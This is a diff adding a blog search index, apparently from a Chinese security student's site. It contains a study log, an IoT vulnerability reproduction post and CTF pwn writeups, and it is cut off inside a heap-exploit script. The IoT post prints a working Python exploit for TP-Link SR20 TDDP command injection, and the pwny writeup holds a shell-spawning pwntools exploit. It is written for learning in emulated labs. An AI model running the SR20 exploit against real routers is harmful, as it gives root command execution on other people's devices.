@@ -1,0 +1,765 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>学习日志</title>
+    <url>/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/</url>
+    <content><![CDATA[<blockquote>
+<p>重开学习日志，为了更好的复盘，调整学习状态</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="2021-6-6"><a href="#2021-6-6" class="headerlink" title="2021.6.6"></a>2021.6.6</h1><ul>
+<li>明天下午概率论考试，此时此刻还想去学习堆利用，pwn实在是太吸引人了</li>
+<li>前几天分别在ubuntu16、18、20上使用buildroot编译了mips编译环境和binwalk，binwalk扩展安装略显挣扎，ubuntu16上的libc存在一些问题(版本是4.0，匹配不上)，无法编译动态链接的可执行文件，还是乖乖在Ubuntu18/20上先搞搞，找了道栈溢出的题，发现虽然学了mips汇编，但还是不熟悉，这得继续加强；其次，调用叶子函数时堆栈上没有返回地址，返回地址存在$ra中；最后，我要恶补计网知识！然后再尝试复现CVE，抱紧澳神大腿</li>
+<li>两个星期以来，修电脑的几天里，肉眼学了几天堆，修完电脑发现上手调试非常手生，说明肌肉记忆才是最靠谱的；目前学到的两个漏洞点：UAF&amp;Heap overflow；一系列的利用方式也围绕这两种情况，如double free、unlink、chunk重叠等，这一切的最终目的就是为了修改fd指针，申请到我们想控制的区域，进而进行hook，总的来说就两个要点：泄露信息与修改fd指针。unsorted bin、small bin、house of orange、沙箱、IO_File等都是我未学或者未理解的点，后面需要进行大量真题练习进行学习</li>
+</ul>
+<h1 id="2021-6-7"><a href="#2021-6-7" class="headerlink" title="2021.6.7"></a>2021.6.7</h1><ul>
+<li>复习半天概率论，考完试已经六点多</li>
+<li>对mips部分指令熟悉了不少，调试一个简单的栈溢出漏洞却不能成功，遇到两个问题：<ul>
+<li>1、IDA Pro堆栈上的局部变量偏移识别错误 </li>
+<li>2、执行<code>jr $ra</code>指令时候，又进行了几个跳转，真正跳到gadget时，已经出现了段错误(crash)，一时间没想明白</li>
+</ul>
+</li>
+<li>开始狂补基础知识……</li>
+</ul>
+<h1 id="2021-6-8"><a href="#2021-6-8" class="headerlink" title="2021.6.8"></a>2021.6.8</h1><ul>
+<li>调了一道2.31版本的简单off-by-null的题目</li>
+</ul>
+<h1 id="2021-6-9"><a href="#2021-6-9" class="headerlink" title="2021.6.9"></a>2021.6.9</h1><ul>
+<li>复现两道国赛题目：pwny&amp;lonelywolf</li>
+<li>效率还是不够高:(</li>
+</ul>
+<h1 id="2021-6-10"><a href="#2021-6-10" class="headerlink" title="2021.6.10"></a>2021.6.10</h1><ul>
+<li>复习了两小节信安数学基础</li>
+<li>复现了TP-Link-sr20远程命令执行漏洞，了解如何操作qemu等(网络这块知识感觉太欠缺了)</li>
+</ul>
+<h1 id="2021-6-11"><a href="#2021-6-11" class="headerlink" title="2021.6.11"></a>2021.6.11</h1><ul>
+<li>复现两个IOT漏洞，还没完……</li>
+</ul>
+<h1 id="2021-6-12-13"><a href="#2021-6-12-13" class="headerlink" title="2021.6.12-13"></a>2021.6.12-13</h1><ul>
+<li>世界名作: 强网杯Pwn方向0解</li>
+</ul>
+]]></content>
+      <categories>
+        <category>记录</category>
+      </categories>
+      <tags>
+        <tag>记录</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>dl_runtime_resolve总结</title>
+    <url>/dl-runtime-resolve%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<p>迟点补……</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>boofuzz学习之路</title>
+    <url>/boofuzz%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/</url>
+    <content><![CDATA[<p>迟点补……</p>
+]]></content>
+      <categories>
+        <category>Fuzz</category>
+      </categories>
+      <tags>
+        <tag>Fuzz</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>IOT漏洞复现合集</title>
+    <url>/IOT%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/</url>
+    <content><![CDATA[<h1 id="1-TP-Link-sr20远程命令执行漏洞分析"><a href="#1-TP-Link-sr20远程命令执行漏洞分析" class="headerlink" title="1 TP-Link-sr20远程命令执行漏洞分析"></a>1 TP-Link-sr20远程命令执行漏洞分析</h1><h2 id="1-1-调试环境"><a href="#1-1-调试环境" class="headerlink" title="1.1 调试环境"></a>1.1 调试环境</h2><ul>
+<li>Ubuntu18.04（安装binwalk&amp;qemu）</li>
+<li>IDA pro 7.5</li>
+</ul>
+<span id="more"></span>
+
+<h2 id="1-2-漏洞概述"><a href="#1-2-漏洞概述" class="headerlink" title="1.2 漏洞概述"></a>1.2 漏洞概述</h2><p>P-Link SR20 设备运行了 V1 版本的 TDDP 协议，V1 版本无需认证，只需往 SR20 设备的 UDP 1040 端口发送数据，且数据的第二字节为 <code>0x31</code> 时，SR20 设备会连接发送该请求设备的 TFTP 服务下载相应的文件并使用 LUA 解释器以 root 权限来执行，这就导致存在远程代码执行漏洞</p>
+<h2 id="1-3-固件解包"><a href="#1-3-固件解包" class="headerlink" title="1.3 固件解包"></a>1.3 固件解包</h2><p>固件下载地址：<a href="https://www.tp-link.com/us/support/download/sr20/#Firmware">Download for SR20 | TP-Link</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://static.tp-link.com/2018/201806/20180611/SR20\(US\)_V1_180518.zip</span><br><span class="line"></span><br><span class="line">unzip SR20\(US\)_V1_180518.zip</span><br><span class="line"></span><br><span class="line">binwalk -Me tpra_sr20v1_us-up-ver1-2-1-P522_20180518-rel77140_2018-05-21_08.42.04.bin</span><br></pre></td></tr></table></figure>
+
+<p>squashfs-root为固件的文件系统，squashfs-root/usr/bin/tddp为存在漏洞的可执行文件</p>
+<h2 id="1-4-漏洞分析"><a href="#1-4-漏洞分析" class="headerlink" title="1.4 漏洞分析"></a>1.4 漏洞分析</h2><p>首先从<code>socket</code>函数进行切入，因为触发远程命令执行需要使用socket，查看<code>socket</code>的引用可以找到<code>sub_16E5C</code>函数，查看<code>sub_16E5C</code>的引用又可以找到<code>sub_936C</code>函数</p>
+<img src="https://pic.imgdb.cn/item/60c25d6f844ef46bb2b48d9d.png" style="zoom: 67%;" />
+
+<p>第一个红色方框为启动标志，第二个红色方框为1040端口绑定，基本上确定<code>sub_936C</code>函数相当于主函数main</p>
+<img src="https://pic.imgdb.cn/item/60c25e0a844ef46bb2bbf241.png" style="zoom: 67%;" />
+
+<p>进入<code>sub_16418</code>函数，可以看到<code>recvfrom</code>将接受到的数据存储在<code>a1 + 45083</code>处</p>
+<img src="https://pic.imgdb.cn/item/60c25f28844ef46bb2c9a0a1.png" style="zoom: 67%;" />
+
+<p>紧接着进入<code>sub_15E74</code>函数，可以看到switch使用接收到的数据的第二个字节作为判断条件</p>
+<img src="https://pic.imgdb.cn/item/60c26032844ef46bb2d5b30c.png" style="zoom: 80%;" />
+
+<p>在case 0x31处的<code>sub_A580</code>函数如下(部分内容省略)：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_A580</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v1; <span class="comment">// r0</span></span><br><span class="line">  __int16 v2; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">64</span>]; <span class="comment">// [sp+8h] [bp-E4h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">64</span>]; <span class="comment">// [sp+48h] [bp-A4h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">64</span>]; <span class="comment">// [sp+88h] [bp-64h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [sp+C8h] [bp-24h]</span></span><br><span class="line">  _BYTE *v11; <span class="comment">// [sp+CCh] [bp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [sp+D0h] [bp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [sp+D4h] [bp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> *v14; <span class="comment">// [sp+D8h] [bp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [sp+DCh] [bp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [sp+E0h] [bp-Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v17; <span class="comment">// [sp+E4h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v16 = <span class="number">1</span>;</span><br><span class="line">  v15 = <span class="number">4</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="keyword">sizeof</span>(v8));</span><br><span class="line">  v1 = <span class="built_in">memset</span>(name, <span class="number">0</span>, <span class="keyword">sizeof</span>(name));</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v13 = luaL_newstate(v1);</span><br><span class="line">  v17 = (<span class="keyword">char</span> *)(a1 + <span class="number">45083</span>);</span><br><span class="line">  v12 = a1 + <span class="number">82</span>;</span><br><span class="line">  v11 = (_BYTE *)(a1 + <span class="number">45083</span>);</span><br><span class="line">  v10 = a1 + <span class="number">82</span>;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">83</span>) = <span class="number">49</span>;</span><br><span class="line">  *(_DWORD *)(v10 + <span class="number">4</span>) = htonl(<span class="number">0</span>);</span><br><span class="line">  *(_BYTE *)(v10 + <span class="number">2</span>) = <span class="number">2</span>;</span><br><span class="line">  v2 = ((<span class="keyword">unsigned</span> __int8)v11[<span class="number">9</span>] &lt;&lt; <span class="number">8</span>) | (<span class="keyword">unsigned</span> __int8)v11[<span class="number">8</span>];</span><br><span class="line">  v3 = v10;</span><br><span class="line">  *(_BYTE *)(v10 + <span class="number">8</span>) = v11[<span class="number">8</span>];</span><br><span class="line">  *(_BYTE *)(v3 + <span class="number">9</span>) = HIBYTE(v2);</span><br><span class="line">  <span class="keyword">if</span> ( *v11 == <span class="number">1</span> ) <span class="comment">//判断接收到的数据的第一个字节</span></span><br><span class="line">  &#123;</span><br><span class="line">    v17 += <span class="number">12</span>; <span class="comment">//接收到的数据存储位置偏移12bytes</span></span><br><span class="line">    v12 += <span class="number">12</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v17 += <span class="number">28</span>;</span><br><span class="line">    v12 += <span class="number">28</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v17 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  <span class="built_in">sscanf</span>(v17, <span class="string">&quot;%[^;];%s&quot;</span>, s, v8); <span class="comment">//对接收到的数据过滤分号，分割成s和v8两部分</span></span><br><span class="line">  <span class="keyword">if</span> ( !s[<span class="number">0</span>] || !v8[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] luaFile or configFile len error.\n&quot;</span>, <span class="string">&quot;tddp_cmd_configSet&quot;</span>, <span class="number">555</span>);</span><br><span class="line">LABEL_20:</span><br><span class="line">    *(_BYTE *)(v10 + <span class="number">3</span>) = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">return</span> sub_13018(<span class="number">-10303</span>, <span class="string">&quot;config set failed&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v14 = inet_ntoa(*(struct in_addr *)(a1 + <span class="number">4</span>));	<span class="comment">//inet_ntoa将网络地址转换成“.”点隔的字符串格式，返回字符串的指针</span></span><br><span class="line">  sub_91DC(<span class="string">&quot;cd /tmp;tftp -gr %s %s &amp;&quot;</span>, s, v14);	<span class="comment">//漏洞函数</span></span><br><span class="line">  <span class="built_in">sprintf</span>(name, <span class="string">&quot;/tmp/%s&quot;</span>, s);	<span class="comment">//name=/tmp/xxx</span></span><br><span class="line">  <span class="comment">//验证是否已下载文件4次,v15 = 4</span></span><br><span class="line">  <span class="keyword">while</span> ( v15 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !access(name, <span class="number">0</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    --v15;</span><br><span class="line">  &#125;</span><br><span class="line">  ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>sub_91DC</code>函数的参数列表是可变的，利用最后一个传进去的参数寻找到其他的参数， 此时的a1=s</p>
+<img src="https://pic.imgdb.cn/item/60c265b4844ef46bb210fab5.png" style="zoom:80%;" />
+
+<p>因此，我们将发送的数据前两字节设置为0x01、0x31，再填充10字节，再加上构造的命令，就可以执行我们的命令</p>
+<h2 id="1-5-漏洞利用"><a href="#1-5-漏洞利用" class="headerlink" title="1.5 漏洞利用"></a>1.5 漏洞利用</h2><h3 id="1-5-1-环境准备"><a href="#1-5-1-环境准备" class="headerlink" title="1.5.1 环境准备"></a>1.5.1 环境准备</h3><p>从<a href="https://people.debian.org/~aurel32/qemu/armhf/">Index of /~aurel32/qemu/armhf (debian.org)</a>下载arm虚拟机运行必需文件</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2</span><br><span class="line"></span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress</span><br><span class="line"></span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress</span><br></pre></td></tr></table></figure>
+
+<p>添加一个虚拟网卡</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo tunctl -t tap0</span><br><span class="line"></span><br><span class="line">sudo ifconfig tap0 10.10.10.1/24 up</span><br></pre></td></tr></table></figure>
+
+<p>启动arm虚拟机(账号密码都为root)</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br></pre></td></tr></table></figure>
+
+<p>arm虚拟机内配置网卡IP</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig eth0 10.10.10.2/24 up</span><br></pre></td></tr></table></figure>
+
+<p>互相ping测试</p>
+<p><img src="https://pic.imgdb.cn/item/60c34faf844ef46bb27b06cc.png"></p>
+<p>新开一个终端将文件传到arm虚拟机</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp -r squashfs-root root@10.10.10.2:/root/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/60c350c8844ef46bb2872e74.png"></p>
+<p>使用chroot切换文件系统(使用 chroot 后，系统读取的是新根下的目录和文件，也就是固件的目录和文件 chroot 默认不会切换 /dev 和 /proc， 因此切换根目录前需要现挂载这两个目录)</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mount -o bind /dev ./squashfs-root/dev/</span><br><span class="line"></span><br><span class="line">mount -t proc /proc/ ./squashfs-root/proc/</span><br><span class="line"></span><br><span class="line">chroot squashfs-root sh # 切换根目录后执行新目录结构下的 sh shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/60c35135844ef46bb28bff60.png"></p>
+<h3 id="1-5-2-执行命令"><a href="#1-5-2-执行命令" class="headerlink" title="1.5.2 执行命令"></a>1.5.2 执行命令</h3><p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from socket import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">tddp_port = 1040</span><br><span class="line">recv_port = 12345</span><br><span class="line">ip = sys.argv[1]</span><br><span class="line">command = sys.argv[2]</span><br><span class="line"></span><br><span class="line">s_send = socket(AF_INET,SOCK_DGRAM,0)</span><br><span class="line">s_recv = socket(AF_INET,SOCK_DGRAM,0)</span><br><span class="line"></span><br><span class="line">s_recv.bind((&#x27;&#x27;,12345))</span><br><span class="line"></span><br><span class="line">payload = &#x27;\x01\x31&#x27;.ljust(12,&#x27;\x00&#x27;)</span><br><span class="line">payload += &quot;123|%s&amp;&amp;echo ;123&quot;%(command)</span><br><span class="line"></span><br><span class="line">s_send.sendto(payload,(ip,tddp_port))</span><br><span class="line">s_send.close()</span><br><span class="line"></span><br><span class="line">res,addr = s_recv.recvfrom(1024)</span><br><span class="line">print res</span><br></pre></td></tr></table></figure>
+
+<p>输入tddp启动服务，使用脚本向10.10.10.2的1040端口发送数据</p>
+<p><img src="https://pic.imgdb.cn/item/60c3525d844ef46bb2996a51.png"></p>
+<h2 id="1-6-参考资料"><a href="#1-6-参考资料" class="headerlink" title="1.6 参考资料"></a>1.6 参考资料</h2><ul>
+<li><a href="https://paper.seebug.org/879/#arm-qemu">https://paper.seebug.org/879/#arm-qemu</a></li>
+<li><a href="https://x1ng.top/2020/10/18/TP-Link-sr20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">https://x1ng.top/2020/10/18/TP-Link-sr20远程命令执行/</a></li>
+</ul>
+<h1 id="2-CVE-2018-5767-amp-CVE-2020-10987漏洞分析"><a href="#2-CVE-2018-5767-amp-CVE-2020-10987漏洞分析" class="headerlink" title="2 CVE-2018-5767&amp;CVE-2020-10987漏洞分析"></a>2 CVE-2018-5767&amp;CVE-2020-10987漏洞分析</h1><h2 id="2-1-漏洞概述"><a href="#2-1-漏洞概述" class="headerlink" title="2.1 漏洞概述"></a>2.1 漏洞概述</h2><ul>
+<li>设备：Tenda AC15 路由器</li>
+<li>固件版本：&lt;V15.03.05.18</li>
+<li>漏洞程序为文件系统下<code>/bin/httpd</code></li>
+</ul>
+<h2 id="2-2-模拟环境搭建"><a href="#2-2-模拟环境搭建" class="headerlink" title="2.2 模拟环境搭建"></a>2.2 模拟环境搭建</h2><h3 id="2-2-1-启动httpd"><a href="#2-2-1-启动httpd" class="headerlink" title="2.2.1 启动httpd"></a>2.2.1 启动httpd</h3><p>用IDA打开提取出来的文件系统中的httpd可执行文件，在<code>sub_2E420</code>(相当于main)函数的两处patch掉，将更改保存到httpd文件</p>
+<p><img src="https://pic.imgdb.cn/item/60c3afdd844ef46bb2d6ddbe.png"></p>
+<p>按照上面一个漏洞利用的环境准备过程操作，最终发现监听到一个错误的IP地址</p>
+<p><img src="https://pic.imgdb.cn/item/60c3b108844ef46bb2e53c8d.png"></p>
+<p>于是采用用户模式启动httpd，方法如下(笔者当前环境下已有br0网卡）:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">—————————没有br0网卡需要创建—————————</span><br><span class="line">sudo tunctl -t br0 -u root          </span><br><span class="line">sudo ifconfig br0 10.10.10.1/24   </span><br><span class="line">——————————————————————————————————</span><br><span class="line">方法1：</span><br><span class="line">cp /usr/bin/qemu-arm-static qemu-arm-static</span><br><span class="line">sudo chroot ./ ./qemu-arm-static ./bin/httpd</span><br><span class="line">方法2：</span><br><span class="line">sudo qemu-arm-static -L ./ bin/httpd </span><br><span class="line">-L   //libc的目录</span><br></pre></td></tr></table></figure>
+
+<img src="https://pic.imgdb.cn/item/60c3b23a844ef46bb2f3679c.png"  />
+
+<p>正常启动httpd</p>
+<h3 id="2-2-2-gdb-multiarch调试"><a href="#2-2-2-gdb-multiarch调试" class="headerlink" title="2.2.2 gdb-multiarch调试"></a>2.2.2 gdb-multiarch调试</h3><blockquote>
+<p>这个调试还不会</p>
+</blockquote>
+<p>开启端口</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-arm-static -g 1234 ./bin/httpd</span><br></pre></td></tr></table></figure>
+
+<p>进入gdb-multiarch设置</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">file httpd</span><br><span class="line"></span><br><span class="line">set architecture arm</span><br><span class="line"></span><br><span class="line">target remote 127.0.0.1:1234</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-3-CVE-2018-5767分析"><a href="#2-3-CVE-2018-5767分析" class="headerlink" title="2.3 CVE-2018-5767分析"></a>2.3 CVE-2018-5767分析</h2><p>测试固件：<a href="https://down.tendacn.com/uploadfile/201401/AC15/US_AC15V1.0BR_V15.03.1.16_multi_TD01.rar">AC15/US_AC15V1.0BR_V15.03.1.16_multi_TD01.rar</a></p>
+<h2 id="2-4-CVE-2018-5767利用"><a href="#2-4-CVE-2018-5767利用" class="headerlink" title="2.4 CVE-2018-5767利用"></a>2.4 CVE-2018-5767利用</h2><h2 id="2-5-CVE-2020-10987分析"><a href="#2-5-CVE-2020-10987分析" class="headerlink" title="2.5 CVE-2020-10987分析"></a>2.5 CVE-2020-10987分析</h2><p>测试固件：<a href="https://down.tenda.com.cn/uploadfile/AC15/US_AC15V1.0BR_V15.03.05.19_multi_TD01.zip">AC15/US_AC15V1.0BR_V15.03.05.19_multi_TD01.zip</a></p>
+<h2 id="2-6-CVE-2020-10987利用"><a href="#2-6-CVE-2020-10987利用" class="headerlink" title="2.6 CVE-2020-10987利用"></a>2.6 CVE-2020-10987利用</h2>]]></content>
+      <categories>
+        <category>IOT</category>
+      </categories>
+      <tags>
+        <tag>Vuln</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Pwn Writeup</title>
+    <url>/Pwn-Writeup/</url>
+    <content><![CDATA[<blockquote>
+<p>五年高考三年真题</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="1-CISCN2021初赛"><a href="#1-CISCN2021初赛" class="headerlink" title="1 CISCN2021初赛"></a>1 CISCN2021初赛</h1><h2 id="1-1-pwny"><a href="#1-1-pwny" class="headerlink" title="1.1 pwny"></a>1.1 pwny</h2><blockquote>
+<p>方法有打<code>__malloc_hook</code>,打<code>write</code>功能的返回地址(我没有成功执行onegadget)  :(，打<code>exit_hook</code>(学会再说)……</p>
+</blockquote>
+<p>一开始每次运行程序都崩溃，还以为下错程序，原来忽略了一个细节：fd(文件描述符)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">size_t read(int fd, void * buf, size_t count);</span><br></pre></td></tr></table></figure>
+
+<p>read()会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中. 若参数count 为0, 则read()不会有作用并返回0，否则返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动</p>
+<table>
+<thead>
+<tr>
+<th align="center">整数值</th>
+<th align="center">名称</th>
+<th align="center">&lt;unistd.h&gt;符号常量</th>
+<th align="center">&lt;stdio.h&gt;文件流</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">0</td>
+<td align="center">Standard input</td>
+<td align="center">STDIN_FILENO</td>
+<td align="center">stdin</td>
+</tr>
+<tr>
+<td align="center">1</td>
+<td align="center">Standard output</td>
+<td align="center">STDOUT_FILENO</td>
+<td align="center">stdout</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="center">Standard error</td>
+<td align="center">STDERR_FILENO</td>
+<td align="center">stderr</td>
+</tr>
+</tbody></table>
+<p><img src="https://pic.imgdb.cn/item/60c1d570844ef46bb2963fed.png"></p>
+<p>fd指向文件<code>/dev/urandom</code></p>
+<p><img src="https://pic.imgdb.cn/item/60c1d6e3844ef46bb2a7b082.png"></p>
+<p>第一次输入索引256，将fd的值覆盖为从<code>/dev/urandom</code>文件读取到的字符，此时fd的值已经无效；第二次输入索引256，将fd的值覆盖为0；紧接着利用数组索引越界，leak出stderr的地址和off_202008的地址，进而算得libc的地址和elf的加载地址；最后利用数组索引越界，将<code>__malloc_hook</code>的内容修改为<code>realloc</code>的地址，再将<code>__realloc_hook</code>的内容修改为onegadget的地址，构成的利用链<code>malloc &gt;&gt; __malloc_hook &gt;&gt; realloc &gt;&gt; __realloc_hook &gt;&gt; onegadget</code>，利用scanf函数读取过长的输入时会调用malloc的特性就可get shell</p>
+<hr>
+<p>关于realloc对栈帧的调整：</p>
+<img src="https://pic.imgdb.cn/item/60c1db57844ef46bb2dd35ef.png" style="zoom: 67%;" />
+
+<p>上图中在push等一系列操作后，末尾就会跳转到<code>__realloc_hook</code>处执行，为了满足onegadget执行的条件，push寄存器的数量也有一定的要求，则<code>__molloc_hook</code>的内容定义为<code>realloc + offset</code> ，可以使用<code>x/20xg $rsp</code>看看堆栈的里面的数值，根据实际情况调整offset的数值</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwny&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lauch_gdb</span>():</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;terminator&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">    gdb.attach(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_con</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">lauch_gdb()</span><br><span class="line">write(<span class="number">256</span>)</span><br><span class="line">write(<span class="number">256</span>)</span><br><span class="line">read(p64(<span class="number">0xFFFFFFFFFFFFFFFC</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Result: &#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).rstrip(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = leak - libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f3d5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a41c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f432</span></span><br><span class="line">read(p64(<span class="number">0xFFFFFFFFFFFFFFF5</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Result: &#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).rstrip(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">code_base = leak - <span class="number">0x202008</span></span><br><span class="line">offset = (malloc_hook - code_base - <span class="number">0x202060</span>) / <span class="number">8</span></span><br><span class="line">write_con(offset, p64(realloc + <span class="number">8</span>)) <span class="comment"># 4/6/8</span></span><br><span class="line">write_con(offset - <span class="number">1</span>, p64(one_gadget))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;: 